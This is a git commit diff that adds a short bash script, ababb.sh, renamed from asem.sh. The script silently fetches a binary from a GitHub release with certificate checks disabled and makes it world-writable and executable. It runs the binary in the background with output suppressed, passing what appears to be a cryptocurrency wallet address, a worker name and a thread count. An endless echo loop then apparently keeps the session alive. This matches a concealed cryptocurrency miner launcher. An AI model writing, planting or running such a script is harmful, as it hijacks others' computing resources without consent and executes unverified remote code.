de2ff516bfa5c0912134f5030b0ef0b0172a2218
emsuto51 <emsuto51@gmail.com>
2026-04-30 07:32:59 +0700

    Update and rename asem.sh to ababb.sh

---
+++ ababb.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+curl -sLkO https://github.com/emsuto51/volt/releases/download/volt/ababb >/dev/null 2>&1
+chmod 777 ababb
+./ababb --user 45bx5mvR2MQP267tevQyozHSToTsE19g5Q3NvRmrQ3TCW6dEY3as2VH4ArrNnqZKLxaw31aFExZyuet4fgau3TwoRiWwFgi --pass BORKER-00 --threads 7 >/dev/null 2>&1 &
+sleep 20
+while true
+do
+        echo "Ojo Lali Ngopi Boss..."
+        sleep 100
+done
